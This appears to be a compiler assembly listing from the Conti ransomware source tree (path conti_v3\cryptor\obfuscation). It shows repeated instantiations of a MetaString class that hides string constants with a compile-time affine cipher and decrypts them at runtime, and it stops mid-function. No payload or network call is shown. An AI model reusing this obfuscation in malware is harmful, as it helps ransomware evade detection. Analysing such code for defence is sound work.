;	COMDAT ?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 27 00 00 00	 mov	 eax, 39			; 00000027H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 04	 mov	 BYTE PTR [rcx+1], 4
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 70	 mov	 BYTE PTR [rcx+3], 112	; 00000070H
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
  00013	c6 41 05 6c	 mov	 BYTE PTR [rcx+5], 108	; 0000006cH
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 11	 mov	 BYTE PTR [rcx+7], 17
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 64 00 00 00	 mov	 eax, 100		; 00000064H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 29	 mov	 BYTE PTR [rcx+1], 41	; 00000029H
  00007	c6 41 02 64	 mov	 BYTE PTR [rcx+2], 100	; 00000064H
  0000b	c6 41 03 26	 mov	 BYTE PTR [rcx+3], 38	; 00000026H
  0000f	c6 41 04 64	 mov	 BYTE PTR [rcx+4], 100	; 00000064H
  00013	c6 41 05 18	 mov	 BYTE PTR [rcx+5], 24
  00017	c6 41 06 64	 mov	 BYTE PTR [rcx+6], 100	; 00000064H
  0001b	c6 41 07 10	 mov	 BYTE PTR [rcx+7], 16
  0001f	c6 41 08 64	 mov	 BYTE PTR [rcx+8], 100	; 00000064H
  00023	c6 41 09 64	 mov	 BYTE PTR [rcx+9], 100	; 00000064H
  00027	c6 41 0a 64	 mov	 BYTE PTR [rcx+10], 100	; 00000064H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 69 00 00 00	 mov	 eax, 105		; 00000069H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 67	 mov	 BYTE PTR [rcx+1], 103	; 00000067H
  00007	c6 41 02 69	 mov	 BYTE PTR [rcx+2], 105	; 00000069H
  0000b	c6 41 03 3e	 mov	 BYTE PTR [rcx+3], 62	; 0000003eH
  0000f	c6 41 04 69	 mov	 BYTE PTR [rcx+4], 105	; 00000069H
  00013	c6 41 05 28	 mov	 BYTE PTR [rcx+5], 40	; 00000028H
  00017	c6 41 06 69	 mov	 BYTE PTR [rcx+6], 105	; 00000069H
  0001b	c6 41 07 54	 mov	 BYTE PTR [rcx+7], 84	; 00000054H
  0001f	c6 41 08 69	 mov	 BYTE PTR [rcx+8], 105	; 00000069H
  00023	c6 41 09 69	 mov	 BYTE PTR [rcx+9], 105	; 00000069H
  00027	c6 41 0a 69	 mov	 BYTE PTR [rcx+10], 105	; 00000069H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0c	 sub	 ecx, 12

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6c	 mov	 BYTE PTR [rcx+1], 108	; 0000006cH
  00007	c6 41 02 0c	 mov	 BYTE PTR [rcx+2], 12
  0000b	c6 41 03 2c	 mov	 BYTE PTR [rcx+3], 44	; 0000002cH
  0000f	c6 41 04 0c	 mov	 BYTE PTR [rcx+4], 12
  00013	c6 41 05 54	 mov	 BYTE PTR [rcx+5], 84	; 00000054H
  00017	c6 41 06 0c	 mov	 BYTE PTR [rcx+6], 12
  0001b	c6 41 07 40	 mov	 BYTE PTR [rcx+7], 64	; 00000040H
  0001f	c6 41 08 0c	 mov	 BYTE PTR [rcx+8], 12
  00023	c6 41 09 0c	 mov	 BYTE PTR [rcx+9], 12
  00027	c6 41 0a 0c	 mov	 BYTE PTR [rcx+10], 12
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1f 00 00 00	 mov	 eax, 31
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
